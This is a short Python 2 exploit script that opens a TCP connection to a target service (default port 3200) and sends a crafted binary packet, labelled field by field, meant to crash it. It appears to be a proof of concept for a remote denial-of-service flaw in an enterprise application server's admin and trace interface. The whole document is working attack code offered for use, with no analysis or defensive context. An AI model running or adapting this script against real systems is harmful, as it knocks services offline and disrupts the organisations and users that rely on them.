import socket, struct
from optparse import OptionParser
 
# Parse the target options
parser = OptionParser()
parser.add_option("-d", "--hostname", dest="hostname", help="Hostname", 
default="localhost")
parser.add_option("-p", "--port", dest="port", type="int", help="Port 
number", default=3200)
(options, args) = parser.parse_args()
 
def send_packet(sock, packet):
    packet = struct.pack("!I", len(packet)) + packet
    sock.send(packet)
 
# Connect
print "[*] Connecting to", options.hostname, "port", options.port
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((options.hostname, options.port))
 
print "[*] Sending crash packet"
 
crash = '\xab\xcd\xe1\x23'  # Magic bytes
crash+= '\x00\x00\x00\x00'  # Id
crash+= '\x00\x00\x00\x5b\x00\x00\x00\x5b'  # Packet/frag length
crash+= '\x03\x00\x00\x00'  # Destination/Opcode/MoreFrags/Type
crash+= 'ENC\x00'  # Admin Eye-catcher
crash+= '\x01\x00\x00\x00'  # Version
crash+= '#EAA'  # Admin Eye-catcher
crash+= '\x01\x00\x00\x00\x00'  # Len
crash+= '\x06\x00\x00\x00\x00\x00'  # Opcode/Flags/RC
crash+= '#EAE'  # Admin Eye-catcher
crash+= '\x01\x04\x00\x00'  # Version/Action/Limit/Tread
crash+= '\x00\x00\x00\x00'
crash+= '\x00\x00\x00\x03\x00\x00\x00\x03'  # Trace Level
crash+= '\x01'  # Logging
crash+= '\x01\x40\x00\x00'  # Max file size
crash+= '\x00\x00\x00\x01\x00\x00\x00\x01'  # No. patterns
crash+= '\x00\x00\x00\x25#EAH'  # Trace Eye-catcher
crash+= '\x01*\x00'  # Trace Pattern
crash+= '#EAD'  # Trace Eye-catcher
 
send_packet(connection, crash)
print "[*] Crash sent !"

